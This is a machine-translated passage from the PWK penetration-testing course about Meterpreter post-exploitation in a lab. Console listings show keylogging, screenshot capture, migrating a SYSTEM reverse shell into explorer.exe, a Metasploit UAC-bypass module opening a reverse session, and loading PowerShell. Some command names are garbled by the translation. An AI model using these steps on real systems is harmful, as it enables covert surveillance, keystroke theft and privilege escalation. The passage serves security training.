<div style="position:absolute;top:111638;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">截图保存到：/root/.msf4/modules/exploits/windows/http/syncbreeze/beVjSnrB.jpeg</font></font></nobr></div>
<div style="position:absolute;top:111655;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">仪表盘 &gt; </font></font></nobr></div>
<div style="position:absolute;top:111675;left:265"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 797 - 截取受感染主机桌面的屏幕截图</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:111704;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">截图的截断版本可以在图 314 中看到： </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:111847;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="95"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 95 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:111880;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:112957;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:112957;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:112957;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">712</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:112331;left:326"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 314：使用 Meterpreter 截取的屏幕截图</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:112361;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">像这样的能力可以让我们捕捉敏感用户动作的图片，否则可能会</font></font></nobr></div>
<div style="position:absolute;top:112381;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">很难被发现。</font><font style="vertical-align: inherit;">Meterpreter 还允许我们启动键盘记录器并检测活跃用户</font></font></nobr></div>
<div style="position:absolute;top:112400;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">keyscan_start</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">keyscan_dump</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">keyscan_stop 进行击键</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:112435;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">meterpreter &gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">keyscan_start</font></font></font></b></nobr></div>
<div style="position:absolute;top:112452;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启动击键嗅探器...</font></font></nobr></div>
<div style="position:absolute;top:112486;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">meterpreter &gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">keyscan_dump</font></font></font></b></nobr></div>
<div style="position:absolute;top:112503;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">转储捕获的击键...</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:112520;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ipconfig&lt;CR&gt;</font></font></b></nobr></div>
<div style="position:absolute;top:112537;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">whoami&lt;CR&gt;</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:112571;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">meterpreter &gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">keyscan_stop</font></font></font></b></nobr></div>
<div style="position:absolute;top:112588;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">停止击键嗅探器...</font></font></nobr></div>
<div style="position:absolute;top:112605;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">仪表盘 &gt; </font></font></nobr></div>
<div style="position:absolute;top:112624;left:324"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 798 - 对受感染用户进行键盘记录</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:112653;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">附加的基本后开发功能包括列出当前用户的空闲时间和</font></font></nobr></div>
<div style="position:absolute;top:112673;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打开麦克风或网络摄像头，这就是大多数安全人员保留网络摄像头的原因</font></font></nobr></div>
<div style="position:absolute;top:112692;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">任何时候都被覆盖。</font></font></nobr></div>
<div style="position:absolute;top:112725;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在执行键盘记录等操作时，重要的是要了解当前的上下文</font></font></nobr></div>
<div style="position:absolute;top:112744;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">meterpreter 会话考虑在内。</font><font style="vertical-align: inherit;">当我们利用 SyncBreeze 应用程序时，我们获得了一个</font></font></nobr></div>
<div style="position:absolute;top:112764;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NT SYSTEM</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户</font><font style="vertical-align: inherit;">的上下文中运行的反向 shell </font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">为了从一个</font></font></nobr></div>
<div style="position:absolute;top:112783;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对于普通用户，我们将不得不将我们的 shell 进程迁移到我们所针对的用户上下文。</font></font></nobr></div>
<div style="position:absolute;top:112816;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们讨论改变上下文的过程。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:112851;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.5.2</font></font></i></nobr></div>
<div style="position:absolute;top:112851;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">迁移进程</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:112888;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当我们破坏主机时，我们的 Meterpreter 有效载荷在</font></font></nobr></div>
<div style="position:absolute;top:112907;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们攻击的应用程序。</font><font style="vertical-align: inherit;">如果受害者关闭该进程，我们对机器的访问也会被关闭。</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:113035;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="96"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 96 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:113068;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:114145;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:114145;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:114145;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">713</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:113164;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">migrate</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令，我们可以将我们的 Meterpreter 的执行移动到不同的</font></font></nobr></div>
<div style="position:absolute;top:113183;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">过程。</font></font></nobr></div>
<div style="position:absolute;top:113216;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为此，我们首先运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ps</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">查看所有正在运行的进程，然后选择一个，例如 explorer.exe，然后</font></font></nobr></div>
<div style="position:absolute;top:113235;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">发出</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">迁移</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:113270;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter &gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ps</font></font></font></b></nobr></div>
<div style="position:absolute;top:113304;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进程列表</font></font></nobr></div>
<div style="position:absolute;top:113321;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">============</font></font></nobr></div>
<div style="position:absolute;top:113355;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PID PPID 名称    </font></font></nobr></div>
<div style="position:absolute;top:113355;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Arch 会话用户    </font></font></nobr></div>
<div style="position:absolute;top:113355;left:684"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">小路</font></font></nobr></div>
<div style="position:absolute;top:113372;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--- ---- ----    </font></font></nobr></div>
<div style="position:absolute;top:113372;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---- ----- ----    </font></font></nobr></div>
<div style="position:absolute;top:113372;left:684"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">----</font></font></nobr></div>
<div style="position:absolute;top:113389;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:113406;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3116 904 WmiPrvSE.exe    </font></font></nobr></div>
<div style="position:absolute;top:113423;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3164 3568 shell_reverse_msf_encoded.exe x86 1    </font></font></nobr></div>
<div style="position:absolute;top:113423;left:579"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">corp\offsec C:\Users\Offsec</font></font></nobr></div>
<div style="position:absolute;top:113440;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.corp\Desktop\shell_reverse_msf_encoded.exe</font></font></nobr></div>
<div style="position:absolute;top:113457;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3224 808 msdtc.exe    </font></font></nobr></div>
<div style="position:absolute;top:113474;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3360 1156 sihost.exe    </font></font></nobr></div>
<div style="position:absolute;top:113474;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x86 1    </font></font></nobr></div>
<div style="position:absolute;top:113474;left:579"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">corp\offsec C:\Windows\Syst</font></font></nobr></div>
<div style="position:absolute;top:113491;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">em32\sihost.exe</font></font></nobr></div>
<div style="position:absolute;top:113508;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3544 808 syncbrs.exe    </font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:113525;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3568 1960 explorer.exe    </font></font></b></nobr></div>
<div style="position:absolute;top:113525;left:457"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x86 1    </font></font></b></nobr></div>
<div style="position:absolute;top:113525;left:579"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">公司\offsec C:\Windows\expl</font></font></b></nobr></div>
<div style="position:absolute;top:113542;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行程序</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:113559;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3820 808 svchost.exe    </font></font></nobr></div>
<div style="position:absolute;top:113559;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x86 1    </font></font></nobr></div>
<div style="position:absolute;top:113559;left:579"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">corp\offsec C:\Windows\Syst</font></font></nobr></div>
<div style="position:absolute;top:113576;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">em32\svchost.exe</font></font></nobr></div>
<div style="position:absolute;top:113593;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:113627;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">迁移 3568</font></font></font></b></nobr></div>
<div style="position:absolute;top:113644;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 从 3164 迁移到 3568...</font></font></nobr></div>
<div style="position:absolute;top:113661;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 迁移成功完成。</font></font></nobr></div>
<div style="position:absolute;top:113680;left:311"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 799 - 迁移到 explorer.exe 进程</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:113709;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，我们只能迁移到以相同权限和完整性执行的进程中</font></font></nobr></div>
<div style="position:absolute;top:113729;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">水平或低于我们目前的流程。</font><font style="vertical-align: inherit;">在 Sync Breeze 的情况下，因为我们正在运行</font></font></nobr></div>
<div style="position:absolute;top:113748;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter payload 具有最大权限（</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NT SYSTEM</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">），我们的选择很多，我们可以</font></font></nobr></div>
<div style="position:absolute;top:113768;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过相应地选择目标进程，将我们的 shell 迁移到不同的用户上下文。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:113802;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.5.3</font></font></i></nobr></div>
<div style="position:absolute;top:113802;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">后开发模块</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:113840;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">除了 Meterpreter 的核心 API 中存在的本机命令和操作之外，还有</font></font></nobr></div>
<div style="position:absolute;top:113859;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以针对活动会话部署几个后开发模块。</font><font style="vertical-align: inherit;">会议</font></font></nobr></div>
<div style="position:absolute;top:113878;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过执行客户端攻击而创建的，可能只会为我们提供一个无特权的 shell。</font><font style="vertical-align: inherit;">但</font></font></nobr></div>
<div style="position:absolute;top:113898;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果目标用户是本地管理员组的成员，我们可以将我们的 shell 提升到一个高度</font></font></nobr></div>
<div style="position:absolute;top:113917;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果我们绕过用户帐户控制 (UAC)，则完整性级别。</font><font style="vertical-align: inherit;">在前面的例子中，我们迁移了我们的</font></font></nobr></div>
<div style="position:absolute;top:113937;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">meterpreter shell 到</font><font style="vertical-align: inherit;">以中等完整性运行</font><font style="vertical-align: inherit;">的</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">explorer.exe</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进程。</font><font style="vertical-align: inherit;">在下面的</font></font></nobr></div>
<div style="position:absolute;top:113956;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">步骤，我们将假设我们已经通过客户端攻击收集了这个 shell。</font></font></nobr></div>
<div style="position:absolute;top:113989;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索 UAC 旁路模块会产生很多结果。</font><font style="vertical-align: inherit;">但是，由于在我们的示例中</font></font></nobr></div>
<div style="position:absolute;top:114008;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">受感染的主机是我们的 Windows 10 Fall Creators Update 客户端机器，我们将重点关注</font></font></nobr></div>
<div style="position:absolute;top:114027;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">bypassuac_injection_winsxs 模块，因为它在此版本的 Windows 上运行良好。</font><font style="vertical-align: inherit;">我们将选择</font></font></nobr></div>
<div style="position:absolute;top:114047;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块并列出其选项。</font><font style="vertical-align: inherit;">这显示了一个名为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SESSION 的</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参数</font><font style="vertical-align: inherit;">，它是目标</font></font></nobr></div>
<div style="position:absolute;top:114066;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter 会话。</font><font style="vertical-align: inherit;">使用</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">set SESSION 10</font></font></b><font style="vertical-align: inherit;">将会话设置为我们的活动 Meterpreter 会话</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b></nobr></div>
</span></font>

<div style="position:absolute;top:114223;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="97"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 97 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:114256;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:115333;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:115333;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:115333;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">714</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:114352;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并且运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">本质上将通过活动会话将漏洞利用输送到易受攻击的</font></font></nobr></div>
<div style="position:absolute;top:114371;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主持人：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:114406;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用exploit/windows/local/bypassuac_injection_winsxs</font></font></font></b></nobr></div>
<div style="position:absolute;top:114440;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（windows/local/bypassuac_injection_winsxs）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示选项</font></font></font></b></nobr></div>
<div style="position:absolute;top:114474;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块选项（exploit/windows/local/bypassuac_injection_winsxs）：</font></font></nobr></div>
<div style="position:absolute;top:114508;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称 当前设置 必需 描述</font></font></nobr></div>
<div style="position:absolute;top:114525;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---- --------------- -------- -----------</font></font></nobr></div>
<div style="position:absolute;top:114542;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会议    </font></font></nobr></div>
<div style="position:absolute;top:114542;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">yes 运行此模块的会话。</font></font></nobr></div>
<div style="position:absolute;top:114593;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">利用目标：</font></font></nobr></div>
<div style="position:absolute;top:114627;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">身份证名称</font></font></nobr></div>
<div style="position:absolute;top:114643;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- - -</font></font></nobr></div>
<div style="position:absolute;top:114660;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0 视窗 x86</font></font></nobr></div>
<div style="position:absolute;top:114712;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（windows/local/bypassuac_injection_winsxs）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置会话 10</font></font></font></b></nobr></div>
<div style="position:absolute;top:114728;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会话 =&gt; 10</font></font></nobr></div>
<div style="position:absolute;top:114762;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（windows/local/bypassuac_injection_winsxs）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用</font></font></font></b></nobr></div>
<div style="position:absolute;top:114796;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 在 10.11.0.4:4444 上启动反向 TCP 处理程序 </font></font></nobr></div>
<div style="position:absolute;top:114813;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] Windows 10（内部版本 16299）。</font><font style="vertical-align: inherit;">可能很脆弱。</font></font></nobr></div>
<div style="position:absolute;top:114830;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] UAC 已启用，检查级别...</font></font></nobr></div>
<div style="position:absolute;top:114847;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 管理员组的一部分！</font><font style="vertical-align: inherit;">继续...</font></font></nobr></div>
<div style="position:absolute;top:114864;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] UAC 设置为默认</font></font></nobr></div>
<div style="position:absolute;top:114881;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] BypassUAC 可以绕过这个设置，继续...</font></font></nobr></div>
<div style="position:absolute;top:114898;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 正在创建临时文件夹...</font></font></nobr></div>
<div style="position:absolute;top:114915;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 正在将 Payload DLL 上传到文件系统...</font></font></nobr></div>
<div style="position:absolute;top:114932;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 使用 Windows Publisher 证书生成过程，注入...</font></font></nobr></div>
<div style="position:absolute;top:114949;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 成功注入有效载荷到进程中：5800</font></font></nobr></div>
<div style="position:absolute;top:114966;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 发送阶段（179779 字节）到 10.11.0.22</font></font></nobr></div>
<div style="position:absolute;top:114983;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter session 11 打开</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(10.11.0.4:4444 -&gt; 10.11.0.22:53870)</font></font></nobr></div>
<div style="position:absolute;top:115017;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">仪表盘 &gt; </font></font></nobr></div>
<div style="position:absolute;top:115036;left:265"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 800 - 使用 Meterpreter 会话执行 UAC 绕过</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:115066;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">除了能够后台活动会话并通过它执行模块之外，我们还可以</font></font></nobr></div>
<div style="position:absolute;top:115085;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">load</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">直接在活动会话中加载扩展</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:115118;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个很好的例子是 PowerShell 扩展</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">717</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，它允许使用 PowerShell。</font><font style="vertical-align: inherit;">和</font></font></nobr></div>
<div style="position:absolute;top:115137;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这个模块，我们可以执行PowerShell命令和脚本，或者启动一个交互式</font></font></nobr></div>
<div style="position:absolute;top:115157;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShell 命令提示符。</font><font style="vertical-align: inherit;">在清单 801 中，我们</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">加载了 powershell</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并列出了可用的子</font></font></nobr></div>
<div style="position:absolute;top:115176;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:115211;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">加载 powershell</font></font></font></b></nobr></div>
<div style="position:absolute;top:115228;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正在加载扩展 powershell...成功。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
